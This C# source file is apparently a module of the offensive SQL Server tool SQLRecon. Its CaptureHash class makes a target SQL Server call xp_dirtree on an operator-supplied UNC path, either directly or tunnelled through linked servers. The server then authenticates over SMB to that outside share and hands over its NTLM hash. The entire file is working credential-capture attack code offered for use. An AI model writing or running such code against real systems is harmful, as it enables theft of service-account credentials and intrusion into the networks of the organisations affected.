using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    internal class CaptureHash
    {
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// This constructor will instruct the remote SQL server to solicit
        /// a SMB request to a supplied UNC path.
        /// </summary>
        /// <param name="con">Connection to SQL Server</param>
        /// <param name="smbShare">The user supplied UNC path</param>
        /// <param name="tunnelSqlServers">A list of SQL Servers forming the tunnel path, if specified</param>
        public CaptureHash(SqlConnection con, string smbShare, string[] tunnelSqlServers = null)
        {
            string query = $"EXEC master..xp_dirtree '{smbShare}';";
            if (tunnelSqlServers != null && tunnelSqlServers.Length > 0)
            {
                string result = _sqlQuery.ExecuteTunnelCustomQuery(con, tunnelSqlServers, $"SELECT 1; {query}");
                return ;
            }
            _sqlQuery.ExecuteCustomQuery(con, $"EXEC master..xp_dirtree '{smbShare}';");
        }
    }
}
